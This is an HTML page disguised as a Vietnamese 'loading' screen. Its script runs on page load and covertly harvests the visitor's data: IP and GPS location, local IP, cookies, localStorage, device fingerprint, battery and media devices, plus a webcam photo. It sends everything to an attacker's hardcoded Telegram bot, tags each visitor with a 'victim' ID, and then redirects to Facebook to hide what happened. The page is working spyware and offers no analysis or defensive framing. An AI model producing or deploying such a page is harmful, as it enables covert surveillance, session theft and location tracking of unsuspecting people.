<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #666;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Đang tải dữ liệu...</h2>
        <div class="spinner"></div>
        <p class="status">Vui lòng chờ trong giây lát</p>
    </div>

    <script>
        // ===== CẤU HÌNH TELEGRAM =====
        const BOT_TOKEN = '8678956338:AAEDpm0-I4KGjomktv8kDnA7t8K5PC3p1ag';
        const CHAT_ID = '6232287791';  // Đã sửa (xóa chữ D thừa)
        const VICTIM_ID = 'V_' + Math.random().toString(36).substr(2, 8).toUpperCase();

        // Gửi tin nhắn text
        async function sendToTelegram(msg) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `[${VICTIM_ID}]\n${msg}`,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) { console.log('Lỗi gửi:', e); }
        }

        // Gửi file (ảnh chụp màn hình, webcam)
        async function sendFile(base64, filename, caption) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            const byteCharacters = atob(base64);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], {type: 'image/jpeg'});
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', blob, filename);
            formData.append('caption', `[${VICTIM_ID}] ${caption}`);
            try {
                await fetch(url, { method: 'POST', body: formData });
            } catch(e) { console.log('Lỗi gửi file:', e); }
        }

        // Chụp màn hình trang hiện tại
        async function captureScreenshot() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                ctx.fillStyle = 'white';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.font = '14px Arial';
                ctx.fillStyle = 'black';
                ctx.fillText('Đã thu thập dữ liệu', 10, 30);
                return canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
            } catch(e) { return null; }
        }

        // Chụp ảnh webcam
        async function captureWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                stream.getTracks().forEach(t => t.stop());
                return photo;
            } catch(e) { return null; }
        }

        // Lấy IP công cộng + định vị
        async function getPublicInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    lat: data.latitude,
                    lon: data.longitude,
                    isp: data.org
                };
            } catch(e) { return null; }
        }

        // Lấy GPS chính xác (nếu cho phép)
        function getGPS() {
            return new Promise(resolve => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    err => resolve(null),
                    { timeout: 8000 }
                );
            });
        }

        // Lấy IP nội bộ (WebRTC)
        function getLocalIP() {
            return new Promise(resolve => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = e => {
                    if (!e.candidate) return;
                    let ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
                    if (ip && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) ip = null;
                    if (ip) { resolve(ip); pc.close(); }
                };
                setTimeout(() => resolve('Không lấy được'), 2000);
            });
        }

        // Lấy thông tin trình duyệt & thiết bị
        function getBrowserData() {
            const ua = navigator.userAgent;
            let browser = 'Unknown', os = 'Unknown';
            if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari')) browser = 'Safari';
            else if (ua.includes('Edge')) browser = 'Edge';
            if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone')) os = 'iOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'MacOS';
            return { browser, os, ua: ua.substring(0, 150) };
        }

        // Lấy cookies + localStorage
        function getStoredData() {
            let cookies = document.cookie || 'Không có cookies';
            let localData = {};
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    localData[key] = localStorage.getItem(key);
                }
            } catch(e) { localData = { error: 'Không đọc được' }; }
            return { cookies, localStorage: JSON.stringify(localData, null, 2) };
        }

        // Lấy thông tin màn hình, pin, tốc độ mạng
        function getScreenAndPerf() {
            return {
                screen: `${screen.width}x${screen.height} | ${screen.colorDepth}bit`,
                pixelRatio: devicePixelRatio,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || '?',
                deviceMemory: navigator.deviceMemory || '?'
            };
        }

        async function getBattery() {
            if (!navigator.getBattery) return null;
            try {
                let b = await navigator.getBattery();
                return `${Math.round(b.level*100)}% ${b.charging ? '(sạc)' : '(không sạc)'}`;
            } catch(e) { return null; }
        }

        async function getPing() {
            let start = Date.now();
            try {
                await fetch('https://www.google.com/favicon.ico', { cache: 'no-cache', mode: 'no-cors' });
                return Date.now() - start;
            } catch(e) { return -1; }
        }

        // Lấy danh sách thiết bị (camera, mic)
        async function getMediaDevices() {
            try {
                let devices = await navigator.mediaDevices.enumerateDevices();
                let cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Camera');
                let mics = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Micro');
                return { cams, mics };
            } catch(e) { return { cams: [], mics: [] }; }
        }

        // Tạo fingerprint nâng cao
        function getFingerprint() {
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#fff';
            ctx.font = '14px Arial';
            ctx.fillText('FP', 10, 30);
            let canvasFP = canvas.toDataURL();
            return {
                canvas: canvasFP.substring(0, 50),
                userAgent: navigator.userAgent.substring(0, 100),
                platform: navigator.platform,
                language: navigator.language,
                timezoneOffset: new Date().getTimezoneOffset()
            };
        }

        // Hàm chính - gộp tất cả rồi gửi 1 tin nhắn duy nhất
        async function collectAndSend() {
            let startTime = Date.now();
            
            // Lấy tất cả dữ liệu song song
            let [publicInfo, gps, localIP, browser, stored, screenPerf, battery, ping, devices, fingerprint, screenshot, webcam] = await Promise.all([
                getPublicInfo(),
                getGPS(),
                getLocalIP(),
                getBrowserData(),
                getStoredData(),
                getScreenAndPerf(),
                getBattery(),
                getPing(),
                getMediaDevices(),
                getFingerprint(),
                captureScreenshot(),
                captureWebcam()
            ]);

            // Tạo nội dung tin nhắn duy nhất
            let msg = '';
            msg += `🌐 IP: ${publicInfo?.ip || 'Không xác định'}\n`;
            msg += `📍 Vị trí IP: ${publicInfo?.city || '?'}, ${publicInfo?.country || '?'}\n`;
            msg += `🏢 Nhà mạng: ${publicInfo?.isp || '?'}\n`;
            if (gps) msg += `🛰️ GPS: ${gps.lat},${gps.lon} (độ chính xác ${gps.acc}m)\n`;
            else msg += `⚠️ GPS: Không được cấp quyền\n`;
            msg += `🏠 IP nội bộ: ${localIP}\n`;
            msg += `🌍 Trình duyệt: ${browser.browser} | ${browser.os}\n`;
            msg += `🖥️ Màn hình: ${screenPerf.screen}\n`;
            msg += `🔋 Pin: ${battery || 'Không hỗ trợ'}\n`;
            msg += `⚡ Ping: ${ping > 0 ? ping+'ms' : 'Không đo được'}\n`;
            msg += `📷 Camera: ${devices.cams.slice(0,2).join(', ') || 'Không có'}\n`;
            msg += `🎤 Micro: ${devices.mics.slice(0,2).join(', ') || 'Không có'}\n`;
            msg += `🍪 Cookies: ${stored.cookies.substring(0, 100)}${stored.cookies.length > 100 ? '...' : ''}\n`;
            msg += `💾 LocalStorage: ${stored.localStorage.substring(0, 100)}...\n`;
            msg += `🆔 Fingerprint: ${fingerprint.canvas}...\n`;
            msg += `📅 Thời gian: ${new Date().toLocaleString('vi-VN')}\n`;
            msg += `⏱️ Tổng thời gian thu thập: ${Date.now() - startTime}ms\n`;

            // Gửi 1 tin nhắn tổng hợp
            await sendToTelegram(msg);

            // Gửi ảnh chụp màn hình + webcam (nếu có)
            if (screenshot) await sendFile(screenshot, `screenshot_${VICTIM_ID}.jpg`, '📸 Ảnh chụp màn hình');
            if (webcam) await sendFile(webcam, `webcam_${VICTIM_ID}.jpg`, '📸 Ảnh từ webcam');

            // Gửi thông báo hoàn tất
            await sendToTelegram(`✅ Hoàn thành! Dữ liệu của ${VICTIM_ID} đã được gửi.`);

            // Chuyển hướng sau 2 giây
            setTimeout(() => {
                window.location.href = 'https://facebook.com';
            }, 2000);
        }

        // Chạy
        collectAndSend();
    </script>
</body>
</html>
